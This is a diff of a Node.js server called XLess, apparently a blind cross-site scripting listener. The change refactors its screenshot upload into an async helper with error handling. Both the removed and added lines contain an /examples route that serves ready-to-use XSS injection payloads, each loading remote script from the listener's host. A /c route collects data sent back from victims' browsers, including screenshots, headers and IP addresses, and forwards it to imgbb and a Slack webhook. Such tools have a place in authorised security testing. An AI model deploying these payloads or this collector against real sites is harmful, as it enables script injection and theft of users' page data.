@@ -58,59 +58,6 @@ function generate_callback_alert(headers, data, url) {
   return(alert)
 }
 
-
-app.get("/examples", (req, res) => {
-  res.header("Content-Type", "text/plain")
-  //var url = req.protocol + '://' + req.headers['host']
-  var url = 'https://' + req.headers['host']
-  var page = ""
-  page += `\'"><script src="${url}"></script>\n\n`
-  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`
-
-  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`
-
-  page += `<script>$.getScript("${url}")</script>`
-  res.send(page)
-  res.end()
-})
-
-
-app.post("/c", (req, res) => {
-    let data = req.body
-    
-    const options = {
-        method: "POST",
-        url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
-        port: 443,
-        headers: {
-            "Content-Type": "multipart/form-data"
-        },
-        formData : {
-            "image" : data["Screenshot"].replace("data:image/png;base64,","")
-        }
-    };
-
-    // Upload our screenshot and only then send the Slack alert
-    data["Screenshot_Url"] = ""
-    request(options, (err, imgRes, imgBody) => {
-      // Try uploading our screenshot
-      const imgOut = JSON.parse(imgBody)
-      if(imgOut && imgOut.data && imgOut.data.url_viewer) {
-        data["Screenshot_Url"] = imgOut.data.url_viewer
-      }
-
-      // Now handle the regular Slack alert
-      data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-      const alert = generate_blind_xss_alert(data)
-      data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
-
-      request.post(slack_incoming_webhook, data, (out)  => {
-        res.send("ok\n")
-        res.end()
-      });
-    })
-})
-
 async function uploadImage(image) {
     
   // Return new promise
@@ -137,6 +84,58 @@ async function uploadImage(image) {
     })
   })
 }
+
+app.get("/examples", (req, res) => {
+  res.header("Content-Type", "text/plain")
+  //var url = req.protocol + '://' + req.headers['host']
+  var url = 'https://' + req.headers['host']
+  var page = ""
+  page += `\'"><script src="${url}"></script>\n\n`
+  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`
+
+  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`
+
+  page += `<script>$.getScript("${url}")</script>`
+  res.send(page)
+  res.end()
+})
+
+
+app.post("/c", async (req, res) => {
+    let data = req.body
+    
+    // Upload our screenshot and only then send the Slack alert
+    data["Screenshot_Url"] = ""
+
+    if (imgbb_api_key && data["Screenshot"]) {
+      const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,","")
+
+      try {
+        const imgRes = await uploadImage(encoded_screenshot)
+        const imgOut = JSON.parse(imgRes)
+        if (imgOut.error) {
+          data["Screenshot_Url"] = imgOut.error
+        }
+        else if(imgOut.data && imgOut.data.url_viewer) {
+          // Add the URL to our data array so it will be included on our Slack message
+          data["Screenshot_Url"] = imgOut.data.url_viewer
+        }
+      }
+      catch (e) {
+        data["Screenshot_Url"] = e.message
+      }
+    }
+
+    // Now handle the regular Slack alert
+    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
+    const alert = generate_blind_xss_alert(data)
+    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+
+    request.post(slack_incoming_webhook, data, (out)  => {
+      res.send("ok\n")
+      res.end()
+    });
+})
 
 /**
  * Route to check the health of our xless listener
